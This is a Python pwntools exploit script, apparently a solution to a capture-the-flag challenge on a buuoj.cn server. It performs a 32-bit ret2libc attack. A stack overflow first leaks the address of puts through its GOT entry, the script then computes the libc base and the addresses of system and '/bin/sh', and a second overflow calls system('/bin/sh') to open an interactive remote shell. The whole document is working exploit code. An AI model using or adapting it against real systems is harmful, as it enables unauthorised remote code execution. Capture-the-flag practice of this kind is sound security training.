#Made by fly_autumn
#x86 ret2libc
from pwn import *
#p = process("./pwn")
p = remote("node5.buuoj.cn",29878)
elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(os="linux",arch="i386")

func_plt = 0x80487d0
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
offset = 0xe7+4
main_addr = 0x8048825

payload = b"\x00" * 7 + b"\xff"
p.sendline(payload)

payload2 = offset*b"\x00" + p32(puts_plt) + p32(main_addr) + p32(puts_got)
p.recvuntil(b"Correct\n")
p.sendline(payload2)

puts_addr = u32(p.recv(4))
log.success("puts addr: "+hex(puts_addr))
libc_addr = puts_addr - libc.sym["puts"]
log.success("libc addr: "+hex(libc_addr))
sys_addr = libc_addr + libc.sym["system"]
log.success("system addr: "+hex(sys_addr))
sh_addr = libc_addr + next(libc.search("/bin/sh"))
log.success("sh addr: "+hex(sh_addr))

p.sendline(payload)

payload3 = offset*b"\x00" + p32(sys_addr) + p32(0) + p32(sh_addr)
p.sendline(payload3)

p.interactive()
